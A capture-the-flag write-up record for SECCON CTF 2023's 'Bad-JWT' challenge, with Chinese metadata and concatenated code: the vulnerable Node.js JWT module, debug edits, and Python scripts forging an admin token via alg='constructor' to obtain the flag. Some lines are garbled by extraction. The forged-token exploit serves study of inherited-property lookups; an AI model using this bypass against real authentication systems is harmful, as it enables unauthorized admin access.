---
title: SECCON CTF 2023 Quals - Bad-JWT
contest: SECCON CTF 2023 Quals
year: 2023
difficulty: hard
vuln_type: jwt_algorithm_confusion
tags:
- jwt
- inherited-property
- node-js
- algorithm-confusion
attack_chain: &id001
- alg=constructor 通过普通对象的原型链命中继承的 Object 构造函数，而非 undefined。
- Object(data, secret) 返回包装 data 的 String 对象；不执行 HMAC，也不使用 secret。
- Buffer.from(calculated_signature, base64) 对 String 包装对象取值并进行 Base64 解码。
- 把相同 header.payload 字符串的 Base64 解码结果用作签名；忽略点号等非 Base64 字符的行为须在目标 Node 版本核验。
- Buffer.compare 比较解码后的字节相等后返回攻击者构造的 isAdmin=true。
key_payload: alg=constructor；签名字节与 Buffer.from(headerPart + "." + payloadPart, "base64")
  一致。
one_liner: 算法名未校验自有属性，alg=constructor 命中继承的 Object，返回可预测的 String 包装对象并绕过签名。
lesson: 算法分发表使用 Map 或自有属性白名单；拒绝非许可算法。此例是继承属性查找问题，不需要修改原型。
quality: reviewed_static
full_path: SECCON_CTF_2023_Quals_–_Bad-JWT.full.md
meta_path: SECCON_CTF_2023_Quals_–_Bad-JWT.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 已根据本文所附 JavaScript 源码修正摘要；静态核验，未运行完整赛题环境。
category: web
subcategory: jwt
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/135314.html
reasoning_chain: *id001
failed_attempts: []
key_observations: *id001
prerequisites:
- JavaScript 原型链 + Symbol.toPrimitive
- JWT 算法（HS256/HS512）+ 自研实现细节
- Node Buffer.from base64 解码行为
- Map vs Object 区别
contest_normalized: SECCON
contest_year: 2023
---
# SECCON CTF 2023 Quals – Bad-JWT

> 原文: https://www.ctfiot.com/135314.html
> ID: 135314


```
const FLAG = "SECCON{dummy}";
const PORT = "3000";

const express = require("express");
const cookieParser = require("cookie-parser");
const jwt = require("./jwt");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

const secret = require("crypto").randomBytes(32).toString("hex");

app.use((req, res, next) => {
 try {
 const token = req.cookies.session;
 const payload = jwt.verify(token, secret);
 req.session = payload;
 } catch (e) {
 return res.status(400).send("Authentication failed" + e);
 }
 return next();
});

app.get("/", (req, res) => {
 if (req.session.isAdmin === true) {
 return res.send(FLAG);
 } else {
 return res.status().send("You are not admin!");
 }
});

app.listen(PORT, () => {
 const admin_session = jwt.sign("HS512", { isAdmin: true }, secret);
 console.log(`[INFO] Use ${admin_session} as session cookie`);
 console.log(`Challenge server listening on port ${PORT}`);
});
const crypto = require("crypto");

const base64UrlEncode = (str) => {
 return Buffer.from(str)
 .toString("base64")
 .replace(/=*$/g, "")
 .replace(/\+/g, "-")
 .replace(/\//g, "_");
};

const base64UrlDecode = (str) => {
 return Buffer.from(str, "base64").toString();
};

const algorithms = {
 hs256: (data, secret) =>
 base64UrlEncode(crypto.createHmac("sha256", secret).update(data).digest()),
 hs512: (data, secret) =>
 base64UrlEncode(crypto.createHmac("sha512", secret).update(data).digest()),
};

const stringifyPart = (obj) => {
 return base64UrlEncode(JSON.stringify(obj));
};

const parsePart = (str) => {
 return JSON.parse(base64UrlDecode(str));
};

const createSignature = (header, payload, secret) => {
 const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
 const signature = algorithms[header.alg.toLowerCase()](data, secret);
 return signature;
};

const parseToken = (token) => {
 const parts = token.split(".");
 if (parts.length !== 3) throw Error("Invalid JWT format");

 const [header, payload, signature] = parts;
 const parsedHeader = parsePart(header);
 const parsedPayload = parsePart(payload);

 return { header: parsedHeader, payload: parsedPayload, signature };
};

const sign = (alg, payload, secret) => {
 const header = {
 typ: "JWT",
 alg: alg,
 };

 const signature = createSignature(header, payload, secret);

 const token = `${stringifyPart(header)}.${stringifyPart(
 payload
 )}.${signature}`;
 return token;
};

const verify = (token, secret) => {
 const { header, payload, signature: expected_signature } = parseToken(token);

 const calculated_signature = createSignature(header, payload, secret);

 const calculated_buf = Buffer.from(calculated_signature, "base64");
 const expected_buf = Buffer.from(expected_signature, "base64");

 if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error("Invalid signature");
 }

 return payload;
};

module.exports = { sign, verify };
const token = req.cookies.session;
const verify = (token, secret) => {
 const { header, payload, signature: expected_signature } = parseToken(token);

 const calculated_signature = createSignature(header, payload, secret);
+ console.log({calculated_signature, expected_signature})

 const calculated_buf = Buffer.from(calculated_signature, "base64");
 const expected_buf = Buffer.from(expected_signature, "base64");

 if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error("Invalid signature");
 }

 return payload;
};
import base64
import requests
import json

header = {"typ": "JWT", "alg": "HS256"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str:
str):
 return base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.ここにシグネチャを入れる"

res = requests.get("http://localhost:
3000/", cookies={"session": jwt})

print(res.text)
const createSignature = (header, payload, secret) => {
 const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
 const signature = algorithms[header.alg.toLowerCase()](data, secret);
 return signature;
};
import base64
import requests
import json

header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str: str):
 return (
 base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 )

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.foo"

res = requests.get("http://localhost:
3000/", cookies={"session": jwt})

print(res.text)
{
 expected_signature: 'foo',
 calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
}
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ"
class Foo {
 [Symbol.toPrimitive]() {
 return "ABC";
 }
}

const buf1 = Buffer.from(new Foo());

console.log({ buf1 }); // { buf1:  }
class Foo {
 [Symbol.toPrimitive]() {
 return "eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9";
 }
}
class Bar {
 [Symbol.toPrimitive]() {
 // add $^.
 return "eyJ0eXAi$O$iJK^V1&Qi.LCJh.&bGc.i^Oi.Jjb.25z^dHJ1Y3RvciJ9"; // ^^
 }
}

const buf1 = Buffer.from(new Foo(), "base64");
const buf2 = Buffer.from(new Bar(), "base64");

console.log({ buf1, buf2 });
//{
// buf1: ,
// buf2: 
//}
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
{
 expected_signature: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ',
 calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ'],
 calculated_buf: ,
 expected_buf: 
}
import base64
import requests
import json

header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str: str):
 return (
 base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 )

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"

res = requests.get("http://bad-jwt.seccon.games:
3000", cookies={"session": jwt})

print(res.text)
SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
```
